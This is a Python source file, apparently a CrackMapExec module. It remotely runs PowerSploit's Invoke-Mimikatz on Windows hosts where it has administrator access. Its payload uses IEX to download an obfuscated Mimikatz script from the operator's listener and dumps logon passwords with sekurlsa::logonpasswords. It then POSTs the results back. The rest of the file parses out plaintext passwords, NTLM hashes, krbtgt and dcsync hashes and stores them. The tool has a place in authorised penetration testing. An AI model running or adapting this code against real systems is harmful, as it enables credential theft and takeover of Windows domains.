from cme.helpers import create_ps_command, get_ps_script, obfs_ps_script, gen_random_string, validate_ntlm, write_log
from datetime import datetime
import re

class CMEModule:
    '''
        Executes PowerSploit's Invoke-Mimikatz.ps1 script
        Module by @byt3bl33d3r
    '''

    name = 'mimikatz'

    description = "Executes PowerSploit's Invoke-Mimikatz.ps1 script"

    def options(self, context, module_options):
        '''
           COMMAND Mimikatz command to execute (default: 'sekurlsa::logonpasswords')
        '''

        self.mimikatz_command = 'privilege::debug sekurlsa::logonpasswords exit'

        if module_options and 'COMMAND' in module_options:
            self.mimikatz_command = module_options['COMMAND']

        #context.log.debug("Mimikatz command: '{}'".format(self.mimikatz_command))

        self.obfs_name = gen_random_string()

    def on_admin_login(self, context, connection):

        payload = '''
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-Mimikatz.ps1');
        $creds = Invoke-{func_name} -Command '{command}';
        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();'''.format(server=context.server, 
                                          port=context.server_port, 
                                          addr=context.localip,
                                          func_name=self.obfs_name,
                                          command=self.mimikatz_command)

        context.log.debug('Payload: {}'.format(payload))
        payload = create_ps_command(payload)
        connection.execute(payload)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-Mimikatz.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open(get_ps_script('Invoke-Mimikatz.ps1'), 'r') as ps_script:
                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                request.wfile.write(ps_script)

        else:
            request.send_response(404)
            request.end_headers()

    def uniquify_tuples(self, tuples):
        """
        uniquify mimikatz tuples based on the password
        cred format- (credType, domain, username, password, hostname, sid)
        
        Stolen from the Empire project.
        """
        seen = set()
        return [item for item in tuples if "{}{}{}{}".format(item[0],item[1],item[2],item[3]) not in seen and not seen.add("{}{}{}{}".format(item[0],item[1],item[2],item[3]))]

    def parse_mimikatz(self, data):
        """
        Parse the output from Invoke-Mimikatz to return credential sets.

        This was directly stolen from the Empire project as well.
        """

        # cred format:
        #   credType, domain, username, password, hostname, sid
        creds = []

        # regexes for "sekurlsa::logonpasswords" Mimikatz output
        regexes = ["(?s)(?<=msv :).*?(?=tspkg :)", "(?s)(?<=tspkg :).*?(?=wdigest :)", "(?s)(?<=wdigest :).*?(?=kerberos :)", "(?s)(?<=kerberos :).*?(?=ssp :)", "(?s)(?<=ssp :).*?(?=credman :)", "(?s)(?<=credman :).*?(?=Authentication Id :)", "(?s)(?<=credman :).*?(?=mimikatz)"]

        hostDomain = ""
        domainSid = ""
        hostName = ""

        lines = data.split("\n")
        for line in lines[0:2]:
            if line.startswith("Hostname:"):
                try:
                    domain = line.split(":")[1].strip()
                    temp = domain.split("/")[0].strip()
                    domainSid = domain.split("/")[1].strip()

                    hostName = temp.split(".")[0]
                    hostDomain = ".".join(temp.split(".")[1:])
                except:
                    pass

        for regex in regexes:

            p = re.compile(regex)

            for match in p.findall(data):

                lines2 = match.split("\n")
                username, domain, password = "", "", ""
                
                for line in lines2:
                    try:
                        if "Username" in line:
                            username = line.split(":",1)[1].strip()
                        elif "Domain" in line:
                            domain = line.split(":",1)[1].strip()
                        elif "NTLM" in line or "Password" in line:
                            password = line.split(":",1)[1].strip()
                    except:
                        pass

                if username != "" and password != "" and password != "(null)":
                    
                    sid = ""

                    # substitute the FQDN in if it matches
                    if hostDomain.startswith(domain.lower()):
                        domain = hostDomain
                        sid = domainSid

                    if validate_ntlm(password):
                        credType = "hash"

                    else:
                        credType = "plaintext"

                    # ignore machine account plaintexts
                    if not (credType == "plaintext" and username.endswith("$")):
                        creds.append((credType, domain, username, password, hostName, sid))

        if len(creds) == 0:
            # check if we have lsadump output to check for krbtgt
            #   happens on domain controller hashdumps
            for x in xrange(8,13):
                if lines[x].startswith("Domain :"):

                    domain, sid, krbtgtHash = "", "", ""

                    try:
                        domainParts = lines[x].split(":")[1]
                        domain = domainParts.split("/")[0].strip()
                        sid = domainParts.split("/")[1].strip()

                        # substitute the FQDN in if it matches
                        if hostDomain.startswith(domain.lower()):
                            domain = hostDomain
                            sid = domainSid

                        for x in xrange(0, len(lines)):
                            if lines[x].startswith("User : krbtgt"):
                                krbtgtHash = lines[x+2].split(":")[1].strip()
                                break

                        if krbtgtHash != "":
                            creds.append(("hash", domain, "krbtgt", krbtgtHash, hostName, sid))
                    except Exception as e:
                        pass

        if len(creds) == 0:
            # check if we get lsadump::dcsync output
            if '** SAM ACCOUNT **' in lines:
                domain, user, userHash, dcName, sid = "", "", "", "", ""
                for line in lines:
                    try:
                        if line.strip().endswith("will be the domain"):
                            domain = line.split("'")[1]
                        elif line.strip().endswith("will be the DC server"):
                            dcName = line.split("'")[1].split(".")[0]
                        elif line.strip().startswith("SAM Username"):
                            user = line.split(":")[1].strip()
                        elif line.strip().startswith("Object Security ID"):
                            parts = line.split(":")[1].strip().split("-")
                            sid = "-".join(parts[0:-1])
                        elif line.strip().startswith("Hash NTLM:"):
                            userHash = line.split(":")[1].strip()
                    except:
                        pass

                if domain != "" and userHash != "":
                    creds.append(("hash", domain, user, userHash, dcName, sid))

        return self.uniquify_tuples(creds)

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            creds = self.parse_mimikatz(data)
            if len(creds):
                context.log.success("Found credentials in Mimikatz output (domain\\username:password)")
                for cred_set in creds:
                    credtype, domain, username, password,_,_ = cred_set
                    
                    #Get the hostid from the DB
                    hostid = context.db.get_hosts(response.client_address[0])[0][0]

                    context.db.add_credential(credtype, domain, username, password, hostid)
                    context.log.highlight('{}\\{}:{}'.format(domain, username, password))

            log_name = 'Mimikatz-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(data, log_name)
            context.log.info("Saved Mimikatz's output to {}".format(log_name))